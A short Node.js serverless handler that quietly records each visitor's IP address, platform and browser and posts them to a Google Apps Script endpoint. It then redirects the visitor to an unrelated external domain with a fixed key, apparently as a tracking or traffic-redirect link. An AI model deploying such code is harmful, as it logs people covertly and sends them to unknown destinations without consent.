
const https = require('https');

module.exports = async (req, res) => {
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const platform = detectPlatform(userAgent);
  const browser = detectBrowser(userAgent);

  const data = JSON.stringify({
    userAgent: userAgent,
    platform: platform,
    browser: browser,
    ip: ip
  });

  const options = {
    hostname: 'script.google.com',
    path: '/macros/s/AKfycbwUJjT1W_uXcg0DJ8xSVIvjySS7tNUYyLL-x5nT2Jp6rMF3bMkTUl03maVNfmMXve5n/exec',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': data.length
    }
  };

  const googleReq = https.request(options, googleRes => {
    googleRes.on('data', () => {});
    googleRes.on('end', () => {
      res.writeHead(302, {
        Location: 'https://declareddetect.com/hp2a67q4t?key=2bf6ae3ce8a4eac785ad953214351e62'
      });
      res.end();
    });
  });

  googleReq.on('error', error => {
    console.error('Error:', error);
    res.writeHead(302, {
      Location: 'https://declareddetect.com/hp2a67q4t?key=2bf6ae3ce8a4eac785ad953214351e62'
    });
    res.end();
  });

  googleReq.write(data);
  googleReq.end();
};

function detectPlatform(ua) {
  if (/android/i.test(ua)) return 'Android';
  if (/iphone|ipad/i.test(ua)) return 'iPhone';
  return 'Desktop';
}

function detectBrowser(ua) {
  if (/FBAV/i.test(ua)) return 'Facebook App';
  if (/Chrome/i.test(ua)) return 'Chrome';
  if (/OPR|Opera Mini/i.test(ua)) return 'Opera Mini';
  if (/Safari/i.test(ua)) return 'Safari';
  if (/Firefox/i.test(ua)) return 'Firefox';
  return 'Unknown';
}
